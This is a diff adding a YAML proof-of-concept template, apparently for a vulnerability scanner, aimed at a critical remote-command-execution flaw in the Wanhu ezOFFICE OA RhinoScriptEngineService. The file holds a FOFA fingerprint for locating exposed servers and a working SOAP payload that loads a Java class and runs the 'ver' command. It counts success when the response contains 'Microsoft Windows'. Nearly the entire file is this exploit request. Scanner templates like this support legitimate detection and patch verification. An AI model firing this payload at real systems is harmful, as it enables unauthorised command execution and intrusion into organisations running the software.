@@ -1,0 +1,30 @@
+id: poc-yaml-wan-hu-rhinoscriptengineservice-command-execution
+info:
+  name: 万户OA RhinoScriptEngineService 命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+requests:
+- method: POST
+  path: /defaultroot/services/./././RhinoScriptEngineService
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: ''
+  data: "<?xml version='1.0' encoding='UTF-8'?>\n<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:jav=\"http://javascript.script.sun.com\">\n<soapenv:Body>\n<eval xmlns=\"\
+    http://127.0.0.1:8080/services/scriptEngine\">\n  <arg0 xmlns=\"\">\n    <![CDATA[\n\
+    \    try {\n    load(\"nashorn:Mozilla_compat.js\");\n    } catch (e) {\n    }\n\
+    \    importPackage(Packages.java.io);\n    importPackage(Packages.java.lang);\n\
+    \    importPackage(Packages.java.util);\n    importPackage(Packages.java.net);\n\
+    \n    new URLClassLoader([new File('../server').toURL()]).loadClass('Test12').getConstructor([Class.forName(\"\
+    java.lang.String\")]).newInstance([\"ver\"]).toString()\n\n\n    ]]>\n  </arg0>\n\
+    \  <arg1 xmlns=\"\" xsi:type=\"urn:SimpleScriptContext\" xmlns:urn=\"urn:beanservice\"\
+    >\n  </arg1>\n</eval>\n</soapenv:Body>\n</soapenv:Envelope>"
+  expression: status_code == 200 && contains(headers,"text/xml") && contains(body,"<soapenv:Body>")
+    && contains(body,"Microsoft Windows")
+variables: {}
+transport: http
